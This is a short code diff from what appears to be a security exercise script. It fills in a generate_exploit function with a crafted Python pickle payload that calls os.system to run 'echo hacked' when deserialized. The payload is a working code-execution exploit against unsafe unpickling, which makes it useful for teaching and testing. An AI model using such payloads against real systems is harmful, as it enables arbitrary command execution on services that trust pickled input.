@@ -7,8 +7,7 @@ def generate_example():
 
 
 def generate_exploit():
-    raise NotImplementedError()
-
+    return "cos\nsystem\n(S'echo hacked'\ntR."
 
 def main(argv):
     if not 2 <= len(argv) <= 3:
